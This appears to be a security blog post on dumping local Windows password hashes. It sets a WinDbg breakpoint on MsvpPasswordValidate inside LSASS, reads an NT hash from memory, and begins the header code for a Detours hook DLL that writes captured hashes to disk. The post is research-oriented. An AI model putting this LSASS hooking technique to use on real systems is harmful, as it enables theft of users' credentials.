---
layout: post
title: Test
subtitle: test
image: /img/aptortellinilogo.jpg
author:
- last
---

### TL;DR
This is a repost of an analysis I posted on my Gitbook some time ago. Basically, when you authenticate as ANY local user on Windows, the NT hash of that user is checked against the NT hash of the supplied password by LSASS through the function `MsvpPasswordValidate`, exported by NtlmShared.dll. If you hook `MsvpPasswordValidate` you can extract this hash without touching the SAM. Of course, to hook this function in LSASS you need admin privilege. Technically it also works for domain users who have logged on the machine at least once, but the resulting hash is not a NT hash, but rather a MSCACHEv2 hash.

### Introduction
Last August [FuzzySec](https://twitter.com/FuzzySec) tweeted [something interesting](https://twitter.com/FuzzySec/status/1292495775512113152):

[![fuzzysec tweet]({{site.baseurl}}/img/fuzzysectweet.PNG)]({{site.baseurl}}/img/fuzzysectweet.PNG)

Since I had some spare time I decided to look into it and try and write my own local password dumping utility. But first, I had to confirm this information.

### Confirming the information
To do so, I fired up a Windows 10 20H2 VM, set it up for kernel debugging and set a breakpoint into lsass.exe at the start of MsvpPasswordValidate (part of the NtlmShared.dll library) through WinDbg. But first you have to find LSASS' _EPROCESS address using the following command:

```
!process 0 0 lsass.exe
```

[![process command]({{site.baseurl}}/img/processcommand.png)]({{site.baseurl}}/img/processcommand.png)

Once the `_EPROCESS` address is found we have to switch WinDbg's context to the target process (your address will be different):

```
.process /i /p /r ffff8c05c70bc080
```

[![process command 2]({{site.baseurl}}/img/processcommand2.png)]({{site.baseurl}}/img/processcommand2.png)

Remember to use the `g` command right after the last command to make the switch actually happen. Now that we are in LSASS' context we can load into the debugger the user mode symbols, since we are in kernel debugging, and then place a breakpoint at `NtlmShared!MsvpPasswordValidate`:

```
.reload /user
bp NtlmShared!MsvpPasswordValidate
```

We can make sure our breakpoint has been set by using the `bl` command:

[![bl command]({{site.baseurl}}/img/blcommand.png)]({{site.baseurl}}/img/blcommand.png)


Before we go on however we need to know what to look for. `MsvpPasswordValidate` is an undocumented function, meaning we won't find it's definition on MSDN. Looking here and there on the interwebz I managed to find it on multiple websites, so here it is:
```c++
BOOLEAN __stdcall MsvpPasswordValidate (
     BOOLEAN UasCompatibilityRequired,
     NETLOGON_LOGON_INFO_CLASS LogonLevel,
     PVOID LogonInformation,
     PUSER_INTERNAL1_INFORMATION Passwords,
     PULONG UserFlags,
     PUSER_SESSION_KEY UserSessionKey,
     PLM_SESSION_KEY LmSessionKey
);
```

What we are looking for is the fourth argument. The "Passwords" argument is of type `PUSER_INTERNAL1_INFORMATION`. This is a pointer to a `SAMPR_USER_INTERNAL1_INFORMATION` structure, whose first member is the NT hash we are looking for:

```c++
typedef struct _SAMPR_USER_INTERNAL1_INFORMATION {
   ENCRYPTED_NT_OWF_PASSWORD EncryptedNtOwfPassword;
   ENCRYPTED_LM_OWF_PASSWORD EncryptedLmOwfPassword;
   unsigned char NtPasswordPresent;
   unsigned char LmPasswordPresent;
   unsigned char PasswordExpired;
 } SAMPR_USER_INTERNAL1_INFORMATION, *PSAMPR_USER_INTERNAL1_INFORMATION;
  ```

As `MsvpPasswordValidate` uses the `stdcall` calling convention, we know the Passwords argument will be stored into the R9 register, hence we can get to the actual structure by dereferencing the content of this register. With this piece of information we type `g` once more in our debugger and attempt a login through the runas command:

[![runas command]({{site.baseurl}}/img/runas.gif)]({{site.baseurl}}/img/runas.gif)

And right there our VM froze because we hit the breakpoint we previously set:

[![breakpoint hit]({{site.baseurl}}/img/breakpoint.png)]({{site.baseurl}}/img/breakpoint.png)

Now that our CPU is where we want it to be we can check the content of R9:

```
db @r9
```

[![db command]({{site.baseurl}}/img/dbr9.png)]({{site.baseurl}}/img/dbr9.png)

That definetely looks like a hash! We know our test user uses "antani" as password and its NT hash is `1AC1DBF66CA25FD4B5708E873E211F06`, so the extracted value is the correct one. 

### Writing the DLL
Now that we have verified FuzzySec's hint we can move on to write our own password dumping utility. We will write a custom DLL which will hook `MsvpPasswordValidate`, extract the hash and write it to disk. This DLL will be called HppDLL, since I will integrate it in a tool I already made (and which I will publish sooner or later) called HashPlusPlus (HPP for short). We will be using Microsoft Detours to perform the hooking action, __better not to use manual hooking when dealing with critical processes like LSASS, as crashing will inevitably lead to a reboot__. I won't go into details on how to compile Detours and set it up, it's pretty straightforward and I will include a compiled Detours library into HppDLL's repository.
The idea here is to have the DLL hijack the execution flow as soon as it reaches `MsvpPasswordValidate`, jump to a rogue routine which we will call `HookMSVPPValidate` and that will be responsible for extracting the credentials. Done that, `HookMSVPPValidate` will return to the legitimate `MsvpPasswordValidate` and continue the execution flow transparently for the calling process. Complex? Not so much actually. 

##### Hppdll.h
We start off by writing the header all of the code pieces will include:

```c++
#pragma once
#define SECURITY_WIN32
#define WIN32_LEAN_AND_MEAN

// uncomment the following definition to enable debug logging to c:\debug.txt
#define DEBUG_BUILD

#include <windows.h>
#include <SubAuth.h>
#include <iostream>
#include <fstream>
#include <string>
#include "detours.h"

// if this is a debug build declare the PrintDebug() function
// and define the DEBUG macro in order to call it
// else make the DEBUG macro do nothing
#ifdef DEBUG_BUILD
void PrintDebug(std::string input);
#define DEBUG(x) PrintDebug(x)
#else
#define DEBUG(x) do {} while (0)
#endif

// namespace containing RAII types to make sure handles are always closed before detaching our DLL
namespace RAII
{
	class Library
	{
	public:
		Library(std::wstring input);
		~Library();
		HMODULE GetHandle();

	private:
		HMODULE _libraryHandle;
	};

	class Handle
	{
	public:
		Handle(HANDLE input);
		~Handle();
		HANDLE GetHandle();

	private:
		HANDLE _handle;
	};
}

//functions used to install and remove the hook
bool InstallHook();
bool RemoveHook();

// define the pMsvpPasswordValidate type to point to MsvpPasswordValidate
typedef BOOLEAN(WINAPI* pMsvpPasswordValidate)(BOOLEAN, NETLOGON_LOGON_INFO_CLASS, PVOID, void*, PULONG, PUSER_SESSION_KEY, PVOID);
extern pMsvpPasswordValidate MsvpPasswordValidate;

// define our hook function with the same parameters as the hooked function
// this allows us to directly access the hooked function parameters
BOOLEAN HookMSVPPValidate
(
	BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	void* Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey
);
```

This header includes various Windows headers that define the various native types used by `MsvpPasswordValidate`. You can see I had to slightly modify the `MsvpPasswordValidate` function definition since I could not find the headers defining `PUSER_INTERNAL1_INFORMATION`, hence we treat it like a normal void pointer. I also define two routines, `InstallHook` and `RemoveHook`, that will deal with injecting our hook and cleaning it up afterwards. I also declare a `RAII` namespace which will hold `RAII` classes to make sure handles to libraries and other stuff will be properly closed as soon as they go out of scope (yay C++).
I also define a `pMsvpPasswordValidate` type which we will use in conjunction with `GetProcAddress` to properly resolve and then call `MsvpPasswordValidate`. Since the `MsvpPasswordValidate` pointer needs to be global we also extern it. 
